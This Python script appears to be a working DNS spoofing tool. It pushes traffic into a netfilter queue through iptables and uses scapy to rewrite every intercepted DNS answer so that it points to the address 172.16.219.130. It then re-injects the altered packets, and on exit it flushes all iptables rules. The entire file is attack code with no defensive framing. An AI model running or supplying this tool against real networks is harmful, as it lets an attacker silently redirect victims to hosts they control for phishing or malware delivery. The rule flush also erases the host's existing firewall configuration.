import optparse;
import subprocess;
import netfilterqueue
import scapy.all as scapy

queue_port = 0

def option_parser():
    parser = optparse.OptionParser()
    parser.add_option('-c', '--command', dest='internal', help='Enter INTERNAL')
    options, arguments = parser.parse_args()
    return options
def configure_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_port, packet_grabber)
    try:
        queue.run()
    except KeyboardInterrupt:
        print('\n\n[+] - Pressed CTRL + C .... Quitting!! Flushing!!')
        subprocess.call(['iptables', '--flush'])
        queue.unbind()

def packet_grabber(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print('[+] - Redirecting to 172.16.219.130')
        # print(scapy_packet.show())
        qname =scapy_packet[scapy.DNS].qd.qname
        new_answer = scapy.DNSRR(rdata='172.16.219.130', rrname=qname)
        scapy_packet[scapy.DNS].an = new_answer
        scapy_packet[scapy.DNS].ancount = 1

        # delete chksum, len
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

options = option_parser()
if not options.internal:
    print('[+] - Spoofing externally')
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])
else:
    print('[+] - Spoofing internally')
    subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])
    subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_port)])

configure_queue()

